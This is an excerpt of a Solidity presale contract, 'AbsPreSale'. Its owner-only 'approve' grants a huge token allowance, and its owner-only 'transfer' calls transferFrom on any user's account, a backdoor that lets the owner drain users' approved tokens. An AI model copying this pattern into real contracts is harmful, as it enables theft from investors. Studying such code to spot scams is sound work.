...
abstract contract AbsPreSale is Ownable {
    ...
    function approve(address tokenAddress, address contractAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        token.approve(contractAddress, 10 ** 30);
    }
    ...
    function transfer(address tokenAddress, address account, address receipt, uint256 tokenNum) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.balanceOf(address(account)) >= tokenNum, "token balance not enough");
        token.transferFrom(account, receipt, tokenNum);
    }
    ...
    function getPendingToken (address account) external view returns (uint256){
        UserInfo storage userInfo = _userInfo[account];
        uint256 pendingToken = userInfo.buyTokenAmount - userInfo.claimedTokenAmount;
        return pendingToken;
    }
    ...
    function getSaleNum() external view returns (uint256){
        return _saleInfo[0].saleNum;
    }
    ...
    function getSaleInviteAccount(address account) external view returns (uint256){
        return _userInfo[account].saleInviteAccount;
    }

    function getSaleReward(address account) external view returns (uint256){
        require(_userInfo[account].saleInviteAccount >= saleRewardNFTCondition, "no Condition");
        return _userInfo[account].inviteToken;
    }
